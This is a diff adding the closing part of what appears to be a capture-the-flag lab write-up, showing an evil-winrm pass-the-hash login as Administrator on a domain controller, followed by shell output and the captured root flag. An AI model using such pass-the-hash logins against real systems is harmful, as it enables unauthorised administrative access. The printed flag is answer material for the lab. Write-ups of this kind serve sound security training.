@@ -648,5 +648,33 @@ Now i can use this hash to authenticate via winrm on dc02
 
 # Administrator on `DC02`
 ```python
+evil-winrm -i dc02.corp.darkhaven.tech -u Administrator -H '7b941d50b17fd85403bd16467c4c9743'
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+corp\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
 
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----        11/14/2024   1:03 AM            470 EC2 Feedback.url
+-a----        11/14/2024   1:03 AM            501 EC2 Microsoft Windows Guide.url
+-a----          3/7/2026   1:25 AM           2351 Microsoft Edge.lnk
+-a----          3/7/2026   2:20 AM             35 root.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
+HSM{QR&^82934tshFHIh2935hjsjaNCI92}
 ```
+Admin on the dc02
